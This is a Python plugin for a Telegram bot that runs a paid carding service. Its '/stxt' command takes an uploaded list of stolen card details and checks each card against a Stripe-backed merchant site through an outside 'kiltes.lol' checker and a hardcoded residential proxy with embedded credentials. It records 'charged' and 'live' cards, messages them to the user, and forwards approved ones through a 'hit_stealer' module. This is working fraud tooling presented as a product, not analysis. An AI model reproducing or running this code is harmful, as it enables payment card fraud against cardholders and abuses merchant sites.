from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import asyncio, time, os, httpx, traceback, random
from datetime import date
from plugins.func.users_sql import fetchinfo, updatedata, insert_reg_data, setantispamtime
from plugins.gates.TOOLS.getcc_for_txt import getcc_for_txt
from plugins.tools.hit_stealer import send_hit_if_approved

user_stop_flags = {}
user_pause_flags = {}

KILTES_URL = "https://kiltes.lol/str/"

async def gcgenfunc(length=6):
    import string
    return "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def elapsed_time(start):
    elapsed = time.perf_counter() - start
    return int(elapsed // 3600), int((elapsed % 3600) // 60), int(elapsed % 60)

async def save_cc(result, file_name):
    try:
        cc = result["fullz"]
        resp = result["response"]
        emoji = {
            "CHARGED": "✅",
            "LIVE": "✅"
        }.get(result["hits"], "❌")
        all_file = os.path.join("HITS", file_name)
        with open(all_file, "a", encoding="utf-8") as f:
            f.write(f"{emoji} {cc} -> {resp}\n")
        if result["hits"] == "CHARGED":
            charged_file = os.path.join("HITS", f"CHARGED_{file_name}")
            with open(charged_file, "a", encoding="utf-8") as f:
                f.write(f"{emoji} {cc} -> {resp}\n")
    except Exception as e:
        print("Save error:", str(e))

async def get_ui(client, msg, total, key, chk_done, charged, live, start, user_id):
    if user_stop_flags.get(user_id):
        return await client.edit_message_text(
            msg.chat.id, msg.id,
            f"⛔ <b>Process Stopped</b>\n\n"
            f"<b>Checked:</b> {chk_done}/{total}\n"
            f"<b>Approved:</b> {charged}\n"
            f"<b>Live:</b> {live}\n"
            f"<b>Dead:</b> {chk_done - charged - live}"
        )

    h, m, s = elapsed_time(start)
    btn_text = "▶️ Resume" if user_pause_flags.get(user_id) else "⏸ Pause"
    callback_data = f"resume_checking_{user_id}" if user_pause_flags.get(user_id) else f"pause_checking_{user_id}"
    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton(btn_text, callback_data=callback_data)],
        [InlineKeyboardButton("⛔ Stop", callback_data=f"stop_checking_{user_id}")]
    ])
    await client.edit_message_text(
        msg.chat.id, msg.id,
        f"<b>Gateway:</b> Stripe Auth ♻️\n\n"
        f"<b>Checked:</b> {chk_done}/{total}\n"
        f"<b>Approved:</b> {charged}\n"
        f"<b>Live:</b> {live}\n"
        f"<b>Dead:</b> {chk_done - charged - live}\n"
        f"<b>Time:</b> {h}h {m}m {s}s\n"
        f"<b>Session:</b> <code>{key}</code>",
        reply_markup=reply_markup
    )

async def get_done(client, msg, total, key, hitsfile, chk_done, charged, live, start):
    h, m, s = elapsed_time(start)
    caption = (
        f"<b>Gateway:</b> Stripe Auth ♻️\n\n"
        f"<b>Total:</b> {total}\n"
        f"<b>Checked:</b> {chk_done}\n"
        f"<b>Approved:</b> {charged}\n"
        f"<b>Live:</b> {live}\n"
        f"<b>Dead:</b> {chk_done - charged - live}\n"
        f"<b>Time:</b> {h}h {m}m {s}s\n"
        f"<b>Session:</b> <code>{key}</code>"
    )
    await msg.reply_document(document=hitsfile, caption=caption, quote=True)

async def check_stripe(card, user_id, session):
    try:
        await asyncio.sleep(random.uniform(1, 2))  # ✅ 1–2 second delay
        params = {
            "cc": card,
            "proxy": "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ",
            "site": "https://www.tekkabazzar.com"
        }
        r = await session.get(KILTES_URL, params=params)
        res = r.json()
        msg = (res.get("result") or res.get("message") or res.get("error") or str(res)).lower()

        if any(x in msg for x in ["charged", "payment method added", "thank you"]):
            return {"hits": "CHARGED", "fullz": card, "response": msg}
        elif any(x in msg for x in ["insufficient", "zip", "cvc", "avs"]):
            return {"hits": "LIVE", "fullz": card, "response": msg}
        elif any(x in msg for x in ["timeout", "rate limit", "proxy error", "connection refused"]):
            return {"hits": "DEAD", "fullz": card, "response": "Request Timeout"}
        else:
            return {"hits": "DEAD", "fullz": card, "response": msg}
    except Exception as e:
        return {"hits": "DEAD", "fullz": card, "response": str(e)}

@Client.on_message(filters.command("stxt", ["/", "."]))
async def stripe_txt_cmd(client, message):
    try:
        if not message.reply_to_message or not message.reply_to_message.document:
            return await message.reply_text("❌ Reply to a .txt file with /stxt", quote=True)

        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        reg = fetchinfo(user_id)
        if not reg:
            insert_reg_data(user_id, username, 200, str(date.today()))
            reg = fetchinfo(user_id)

        role = reg[2] or "FREE"
        credits = int(reg[5] or 0)

        if role != "PREMIUM":
            return await message.reply("❌ Only PREMIUM users can use this command.")

        user_stop_flags[user_id] = False
        user_pause_flags[user_id] = False

        randkey = await gcgenfunc()
        key = f"stxt{user_id}_{randkey}"
        file_name = f"{key}.txt"
        download_path = os.path.join("downloads", file_name)
        os.makedirs("downloads", exist_ok=True)
        os.makedirs("HITS", exist_ok=True)

        await message.reply_to_message.download(file_name=download_path)
        valid, cc_list = await getcc_for_txt(download_path, role)
        if not valid:
            return await message.reply_text(cc_list, quote=True)

        total_cards = len(cc_list)
        if total_cards > 3000:
            return await message.reply(f"❌ Max 3000 cards allowed. You sent {total_cards}.")

        if credits < total_cards:
            return await message.reply(f"❌ Not enough credits. Need {total_cards - credits} more.")

        status_msg = await message.reply("⏳ Starting Stripe Auth Check...", quote=True)
        hitsfile = os.path.join("HITS", file_name)
        chk_done = charged = live = 0
        start_time = time.perf_counter()

        async with httpx.AsyncClient(timeout=30) as session:
            BATCH = 10
            for i in range(0, total_cards, BATCH):
                if user_stop_flags.get(user_id):
                    break
                while user_pause_flags.get(user_id):
                    await asyncio.sleep(1)
                    await get_ui(client, status_msg, total_cards, key, chk_done, charged, live, start_time, user_id)

                batch = cc_list[i:i + BATCH]
                tasks = [check_stripe(c["fullz"], user_id, session) for c in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                for r in results:
                    chk_done += 1
                    if isinstance(r, Exception):
                        r = {"hits": "DEAD", "fullz": "Unknown", "response": str(r)}
                    hits = r["hits"]
                    if hits == "CHARGED":
                        charged += 1
                    elif hits == "LIVE":
                        live += 1
                    if hits in ["CHARGED", "LIVE"]:
                        label = "Approved ✅" if hits == "CHARGED" else "Live ✅"
                        await client.send_message(
                            message.from_user.id,
                            f"<b>{label}</b>\n<code>{r['fullz']}</code>\n<b>Response:</b> {r['response']}"
                        )
                        if hits == "CHARGED":
                            await send_hit_if_approved(r['fullz'], r)
                    await save_cc(r, file_name)

                await get_ui(client, status_msg, total_cards, key, chk_done, charged, live, start_time, user_id)

        if not user_stop_flags.get(user_id):
            await get_done(client, message, total_cards, key, hitsfile, chk_done, charged, live, start_time)
            updatedata(user_id, "credits", credits - total_cards)
            setantispamtime(user_id)
        else:
            await message.reply("⛔ Process stopped by user.")

    except Exception:
        await message.reply_text(f"❌ Error:\n<code>{traceback.format_exc()}</code>", quote=True)

@Client.on_callback_query(filters.regex(r"stop_checking_(\d+)"))
async def stop_checking(client, cb):
    user_id = str(cb.from_user.id)
    if user_id == cb.matches[0].group(1):
        user_stop_flags[user_id] = True
        await cb.answer("⛔ Stopping...")
    else:
        await cb.answer("❌ Not your session.", show_alert=True)

@Client.on_callback_query(filters.regex(r"pause_checking_(\d+)"))
async def pause_checking(client, cb):
    user_id = str(cb.from_user.id)
    if user_id == cb.matches[0].group(1):
        user_pause_flags[user_id] = True
        await cb.answer("⏸ Paused")
    else:
        await cb.answer("❌ Not your session.", show_alert=True)

@Client.on_callback_query(filters.regex(r"resume_checking_(\d+)"))
async def resume_checking(client, cb):
    user_id = str(cb.from_user.id)
    if user_id == cb.matches[0].group(1):
        user_pause_flags[user_id] = False
        await cb.answer("▶️ Resumed")
    else:
        await cb.answer("❌ Not your session.", show_alert=True)
